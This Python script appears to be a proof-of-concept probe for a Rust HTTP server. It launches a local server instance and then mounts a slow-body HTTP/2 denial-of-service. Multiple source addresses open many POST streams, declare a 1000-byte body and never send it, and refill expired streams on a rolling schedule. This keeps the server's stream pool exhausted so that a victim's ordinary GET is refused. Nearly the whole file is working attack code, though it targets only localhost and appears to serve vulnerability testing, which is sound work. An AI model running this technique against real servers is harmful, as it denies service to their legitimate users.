#!/usr/bin/env python3
"""P32 probe: hold the process-wide HTTP/2 stream pool with partial request bodies.

Eight source addresses each open one TLS/h2 connection.  Every stream sends a
POST head with Content-Length: 1000 and then withholds DATA.  The H2 adapter
keeps the stream's process-wide lease while read_body() waits out its complete
body deadline.  Streams are opened on a rolling schedule and replaced as the
server returns 408, so the 256-slot pool stays full.  A victim on a ninth
source then receives RST_STREAM REFUSED_STREAM for an ordinary GET.
"""

import argparse
import os
import pwd
import grp
import socket
import ssl
import subprocess
import sys
import time
from pathlib import Path

import h2.config
import h2.connection
import h2.events
import h2.settings

ROOT = Path(__file__).resolve().parents[2]
HTTPD_RS = ROOT / "target/release/httpd-rs"
RUN = Path("/tmp/opencode/p32-h2bodyhold")
TLS_PORT = 19994
PLAIN_PORT = 19995


def setup() -> None:
    import shutil

    shutil.rmtree(RUN, ignore_errors=True)
    for d in ("logs", "www"):
        (RUN / d).mkdir(parents=True, exist_ok=True)
    (RUN / "www" / "small.txt").write_bytes(b"small-p32\n")
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-days", "2", "-subj", "/CN=p32.local",
            "-keyout", str(RUN / "key.pem"), "-out", str(RUN / "cert.pem"),
        ],
        check=True, capture_output=True,
    )
    (RUN / "cert.pem").chmod(0o644)
    (RUN / "key.pem").chmod(0o600)
    if os.geteuid() == 0:
        service_user = "www-data"
        service_group = "www-data"
    else:
        service_user = pwd.getpwuid(os.geteuid()).pw_name
        service_group = grp.getgrgid(os.getegid()).gr_name
    conf = RUN / "httpd.conf"
    conf.write_text(
        f'''ServerRoot "{RUN}"
Listen 127.0.0.1:{PLAIN_PORT}
Listen 127.0.0.1:{TLS_PORT}
User {service_user}
Group {service_group}
PidFile "{RUN}/logs/pid"
ErrorLog "{RUN}/logs/error.log"
LogLevel warn
ServerName p32.local
Timeout 60
KeepAliveTimeout 5
DocumentRoot "{RUN}/www"
# A body-capable handler makes the adapter route POST bodies to the request
# body reader instead of rejecting them up-front as static-only traffic.
ProxyPass "/hold" "http://127.0.0.1:1/"
<Directory />
    Require all denied
</Directory>
<Directory "{RUN}/www">
    Options FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
<VirtualHost 127.0.0.1:{TLS_PORT}>
    ServerName p32.local
    SSLEngine on
    SSLCertificateFile "{RUN}/cert.pem"
    SSLCertificateKeyFile "{RUN}/key.pem"
    DocumentRoot "{RUN}/www"
    ProxyPass "/hold" "http://127.0.0.1:1/"
    <Directory "{RUN}/www">
        Options FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
'''
    )
    conf.chmod(0o644)
    (RUN / "logs" / "error.log").touch()
    (RUN / "logs" / "error.log").chmod(0o644)
    (RUN / "logs" / "pid").touch()
    (RUN / "logs" / "pid").chmod(0o644)


def start() -> subprocess.Popen:
    log = (RUN / "server.out").open("wb")
    p = subprocess.Popen(
        [str(HTTPD_RS), "-f", str(RUN / "httpd.conf"), "-DFOREGROUND"],
        stdout=log, stderr=subprocess.STDOUT, start_new_session=True,
    )
    for _ in range(200):
        if p.poll() is not None:
            raise SystemExit(f"httpd-rs exited: {(RUN/'server.out').read_text(errors='replace')}")
        try:
            socket.create_connection(("127.0.0.1", PLAIN_PORT), timeout=0.3).close()
            return p
        except OSError:
            time.sleep(0.05)
    raise SystemExit("httpd-rs did not start")


def tls_socket(host: str, source: str | None = None) -> ssl.SSLSocket:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if source:
        raw.bind((source, 0))
    raw.settimeout(10)
    raw.connect((host, TLS_PORT))
    s = ctx.wrap_socket(raw, server_hostname="p32.local")
    assert s.selected_alpn_protocol() == "h2", s.selected_alpn_protocol()
    return s


class BodyHolder:
    """One h2 connection that keeps up to ``limit`` partial-body streams."""

    def __init__(self, source: str, limit: int = 32, path: str = "/hold"):
        self.source = source
        self.limit = limit
        self.path = path
        self.sock = tls_socket("127.0.0.1", source)
        cfg = h2.config.H2Configuration(client_side=True, header_encoding=None)
        self.conn = h2.connection.H2Connection(config=cfg)
        self.conn.initiate_connection()
        self.sock.sendall(self.conn.data_to_send())
        self.conn.receive_data(self.sock.recv(65536))
        self.active: dict[int, float] = {}
        self.total_opened = 0
        self.total_408 = 0
        self.total_reset = 0
        self.total_ended = 0
        self.statuses: dict[bytes, int] = {}

    def drain(self) -> None:
        self.sock.settimeout(0.0)
        try:
            while True:
                data = self.sock.recv(1 << 20)
                if not data:
                    break
                for event in self.conn.receive_data(data):
                    sid = getattr(event, "stream_id", None)
                    if isinstance(event, h2.events.ResponseReceived):
                        for k, v in event.headers:
                            if k == b":status":
                                self.statuses[v] = self.statuses.get(v, 0) + 1
                                if v == b"408":
                                    self.total_408 += 1
                    elif isinstance(event, h2.events.StreamEnded):
                        self.total_ended += 1
                        self.active.pop(sid, None)
                    elif isinstance(event, h2.events.StreamReset):
                        self.total_reset += 1
                        self.active.pop(sid, None)
                self.sock.sendall(self.conn.data_to_send())
        except (BlockingIOError, TimeoutError, socket.timeout, OSError):
            pass
        finally:
            self.sock.settimeout(10)

    def open_one(self) -> bool:
        if len(self.active) >= self.limit:
            return False
        sid = self.conn.get_next_available_stream_id()
        self.conn.send_headers(
            sid,
            [
                (b":method", b"POST"),
                (b":scheme", b"https"),
                (b":authority", b"p32.local"),
                (b":path", self.path.encode()),
                (b"content-length", b"1000"),
            ],
            end_stream=False,
        )
        # Deliberately send no DATA. The head alone starts the body deadline.
        self.sock.sendall(self.conn.data_to_send())
        self.active[sid] = time.time()
        self.total_opened += 1
        return True

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


def victim_probe(source: str | None = None, path: str = "/small.txt") -> str:
    try:
        sock = tls_socket("127.0.0.1", source)
    except Exception as e:
        return f"connect-error:{e}"
    cfg = h2.config.H2Configuration(client_side=True, header_encoding=None)
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    conn.receive_data(sock.recv(65536))
    sid = conn.get_next_available_stream_id()
    conn.send_headers(
        sid,
        [
            (b":method", b"GET"),
            (b":scheme", b"https"),
            (b":authority", b"p32.local"),
            (b":path", path.encode()),
        ],
        end_stream=True,
    )
    sock.sendall(conn.data_to_send())
    status = None
    body = b""
    reset = None
    terminated = None
    deadline = time.time() + 8
    sock.settimeout(2)
    try:
        while time.time() < deadline:
            data = sock.recv(65536)
            if not data:
                break
            for ev in conn.receive_data(data):
                if isinstance(ev, h2.events.ResponseReceived):
                    for k, v in ev.headers:
                        if k == b":status":
                            status = v
                elif isinstance(ev, h2.events.DataReceived):
                    body += ev.data
                    conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                elif isinstance(ev, h2.events.StreamReset):
                    reset = ev.error_code
                elif isinstance(ev, h2.events.ConnectionTerminated):
                    terminated = ev.error_code
            sock.sendall(conn.data_to_send())
            if status or reset is not None or terminated is not None:
                break
    except (TimeoutError, socket.timeout, OSError):
        pass
    finally:
        sock.close()
    return f"status={status} reset={reset} terminated={terminated} body={len(body)}"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--sources", type=int, default=8)
    ap.add_argument("--connections-per-source", type=int, default=1)
    ap.add_argument("--per-source", type=int, default=32)
    ap.add_argument("--open-interval", type=float, default=0.15,
                    help="seconds between stream opens; staggers expiries")
    ap.add_argument("--fill-seconds", type=int, default=45)
    ap.add_argument("--hold-seconds", type=int, default=140)
    args = ap.parse_args()

    setup()
    proc = start()
    try:
        print("baseline victim:", victim_probe(), flush=True)
        holders = []
        for i in range(args.sources):
            for _ in range(args.connections_per_source):
                holders.append(BodyHolder(f"127.0.0.{i + 2}", args.per_source))
        started = time.time()
        next_open = started
        target_streams = len(holders) * args.per_source
        # Rolling open schedule.  Once the pool is full each expiry is filled
        # immediately, so the steady state keeps one stream in each slot.
        end = started + args.fill_seconds + args.hold_seconds
        victim_last = 0.0
        while time.time() < end:
            now = time.time()
            for h in holders:
                h.drain()
            if now >= next_open:
                for h in holders:
                    if len(h.active) < h.limit:
                        h.open_one()
                        break
                next_open += args.open_interval
            total_active = sum(len(h.active) for h in holders)
            if total_active >= target_streams and now - victim_last >= 10:
                victim_last = now
                print(f"t={int(now - started)}s active={total_active} "
                      f"opened={sum(h.total_opened for h in holders)} "
                      f"408s={sum(h.total_408 for h in holders)} "
                      f"resets={sum(h.total_reset for h in holders)} "
                      f"victim={victim_probe()}", flush=True)
            time.sleep(0.01)
        total_active = sum(len(h.active) for h in holders)
        print(f"full-pool steady state reached; active={total_active} "
              f"victim={victim_probe()}", flush=True)
        for h in holders:
            h.close()
        time.sleep(1)
        print("after release:", victim_probe(), flush=True)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    main()
